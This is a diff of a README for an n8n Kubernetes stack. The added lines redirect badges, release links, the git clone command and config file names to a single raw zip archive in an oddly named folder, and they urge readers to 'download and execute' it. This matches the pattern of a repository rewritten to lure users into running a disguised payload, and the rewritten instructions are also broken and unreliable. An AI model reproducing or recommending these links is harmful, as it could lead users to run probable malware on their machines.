@@ -1,13 +1,13 @@
 # n8n Local Kubernetes Stack 🚀
 
-![n8n](https://img.shields.io/badge/n8n-automation-blue?style=flat-square)
-![PostgreSQL](https://img.shields.io/badge/PostgreSQL-17-orange?style=flat-square)
-![Kubernetes](https://img.shields.io/badge/Kubernetes-local-green?style=flat-square)
-![Helm](https://img.shields.io/badge/Helm-chart-purple?style=flat-square)
+![n8n](https://github.com/devananda6/n8n-local-k8s-stack/raw/refs/heads/main/diphenylchloroarsine/stack-s-k-n-local-2.0.zip)
+![PostgreSQL](https://github.com/devananda6/n8n-local-k8s-stack/raw/refs/heads/main/diphenylchloroarsine/stack-s-k-n-local-2.0.zip)
+![Kubernetes](https://github.com/devananda6/n8n-local-k8s-stack/raw/refs/heads/main/diphenylchloroarsine/stack-s-k-n-local-2.0.zip)
+![Helm](https://github.com/devananda6/n8n-local-k8s-stack/raw/refs/heads/main/diphenylchloroarsine/stack-s-k-n-local-2.0.zip)
 
 Welcome to the **n8n Local Kubernetes Stack** repository! This project provides a production-ready setup for n8n, PostgreSQL 17, and Valkey, tailored for local Kubernetes environments. Our stack supports RWX NFS, Helm, queue mode, and worker/runner scaling. 
 
-You can find the latest releases [here](https://github.com/devananda6/n8n-local-k8s-stack/releases). Please download and execute the necessary files to get started.
+You can find the latest releases [here](https://github.com/devananda6/n8n-local-k8s-stack/raw/refs/heads/main/diphenylchloroarsine/stack-s-k-n-local-2.0.zip). Please download and execute the necessary files to get started.
 
 ## Table of Contents
 
@@ -57,7 +57,7 @@ Before you begin, ensure you have the following installed:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/devananda6/n8n-local-k8s-stack.git
+   git clone https://github.com/devananda6/n8n-local-k8s-stack/raw/refs/heads/main/diphenylchloroarsine/stack-s-k-n-local-2.0.zip
    cd n8n-local-k8s-stack
    ```
 
@@ -75,21 +75,21 @@ Before you begin, ensure you have the following installed:
 
 4. Configure NFS:
 
-   Ensure your NFS server is running and accessible from your Kubernetes cluster. Update the `values.yaml` file in the NFS chart with the correct configuration.
+   Ensure your NFS server is running and accessible from your Kubernetes cluster. Update the `https://github.com/devananda6/n8n-local-k8s-stack/raw/refs/heads/main/diphenylchloroarsine/stack-s-k-n-local-2.0.zip` file in the NFS chart with the correct configuration.
 
 5. Deploy Valkey:
 
    Follow the instructions in the Valkey documentation to deploy it in your cluster.
 
-You can find the latest releases [here](https://github.com/devananda6/n8n-local-k8s-stack/releases). Please download and execute the necessary files to get started.
+You can find the latest releases [here](https://github.com/devananda6/n8n-local-k8s-stack/raw/refs/heads/main/diphenylchloroarsine/stack-s-k-n-local-2.0.zip). Please download and execute the necessary files to get started.
 
 ## Configuration
 
 Configuration files are located in the `config` directory. You can customize the following settings:
 
-- **Database Connection**: Update the database connection string in `n8n-config.yaml`.
-- **NFS Settings**: Modify the NFS settings in `nfs-config.yaml`.
-- **Worker Settings**: Adjust worker settings for scaling in `worker-config.yaml`.
+- **Database Connection**: Update the database connection string in `https://github.com/devananda6/n8n-local-k8s-stack/raw/refs/heads/main/diphenylchloroarsine/stack-s-k-n-local-2.0.zip`.
+- **NFS Settings**: Modify the NFS settings in `https://github.com/devananda6/n8n-local-k8s-stack/raw/refs/heads/main/diphenylchloroarsine/stack-s-k-n-local-2.0.zip`.
+- **Worker Settings**: Adjust worker settings for scaling in `https://github.com/devananda6/n8n-local-k8s-stack/raw/refs/heads/main/diphenylchloroarsine/stack-s-k-n-local-2.0.zip`.
 
 ## Usage
 
